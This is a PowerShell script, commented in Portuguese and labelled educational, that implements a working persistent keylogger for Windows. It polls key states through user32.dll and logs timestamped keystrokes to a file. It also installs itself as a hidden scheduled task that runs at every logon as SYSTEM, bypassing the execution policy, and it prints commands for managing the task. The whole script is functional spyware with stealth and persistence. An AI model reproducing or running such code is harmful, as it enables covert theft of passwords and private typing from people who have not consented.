# Keylogger PERSISTENTE v1.0 - SOBREVE REBOOT!
# EDUCACIONAL - Use com RESPONSABILIDADE
param(
    $LogPath="$env:USERPROFILE\AppData\Local\keys-persistente.log",
    $TaskName="MeuKeylogger"
)

Write-Warning "⚠️  Keylogger PERSISTENTE - Inicia com Windows!"

# 1. CRIA PASTA LOG
New-Item -ItemType Directory -Force -Path (Split-Path $LogPath) | Out-Null

# 2. Windows API (Global Capture)
Add-Type -TypeDefinition @"
using System; using System.Runtime.InteropServices;
public class WinAPI {
    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
}
"@

# 3. Mapa teclas
$teclas = @{
    65='a';66='b';67='c';68='d';69='e';70='f';71='g';72='h';73='i';74='j';
    75='k';76='l';77='m';78='n';79='o';80='p';81='q';82='r';83='s';84='t';
    85='u';86='v';87='w';88='x';89='y';90='z';186=';';188=',';190='.';191='/';
    32=' ';13='[ENTER]';8='[BACKSPACE]'
}

# 4. FUNÇÃO PRINCIPAL (oculta)
function Start-Keylogger {
    param($LogPath)
    $buffer = @(); $estadoAnterior = @{}
    
    while($true) {
        foreach($vkCode in $teclas.Keys) {
            $estado = [WinAPI]::GetAsyncKeyState($vkCode)
            $pressionada = ($estado -band 0x8000)
            
            if($pressionada -and !$estadoAnterior[$vkCode]) {
                $char = $teclas[$vkCode]
                $buffer += $char
                
                # Salva em ENTER ou 12+ chars
                if($char -eq '[ENTER]' -or $buffer.Count -ge 12) {
                    $texto = ($buffer -join '').Trim()
                    if($texto) {
                        "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') → $texto" | Out-File $LogPath -Append -Encoding UTF8
                    }
                    $buffer = @()
                }
            }
            $estadoAnterior[$vkCode] = $pressionada
        }
        Start-Sleep -Milliseconds 20
    }
}

# 5. REGISTRA TASK SCHEDULER (inicia com Windows + oculto)
$ScriptPath = $MyInvocation.MyCommand.Path
$Action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$ScriptPath`" -LogPath `"$LogPath`""
$Trigger = New-ScheduledTaskTrigger -AtLogOn
$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable

try {
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Force
    Write-Host "✅ INSTALADO como TASK '$TaskName'!" -ForegroundColor Green
    Write-Host "✅ Inicia AUTOMATICAMENTE no login!" -ForegroundColor Green
} catch {
    Write-Host "❌ Erro instalação: $_" -ForegroundColor Red
}

# 6. COMANDOS DE CONTROLE
Write-Host "`n🛠️  COMANDOS ÚTEIS:" -ForegroundColor Cyan
Write-Host "   VER STATUS:  Get-ScheduledTask '$TaskName' | Get-ScheduledTaskInfo" -ForegroundColor White
Write-Host "   PARAR:       Stop-ScheduledTask '$TaskName'" -ForegroundColor Yellow
Write-Host "   REMOVER:     Unregister-ScheduledTask '$TaskName' -Confirm:`$false" -ForegroundColor Red
Write-Host "   LOG:         notepad '$LogPath'" -ForegroundColor Yellow

# 7. INICIA TESTE VISÍVEL (Ctrl+C para parar)
Write-Host "`n🎹 Iniciando TESTE VISÍVEL... (Ctrl+C)" -ForegroundColor Magenta
Start-Keylogger -LogPath $LogPath
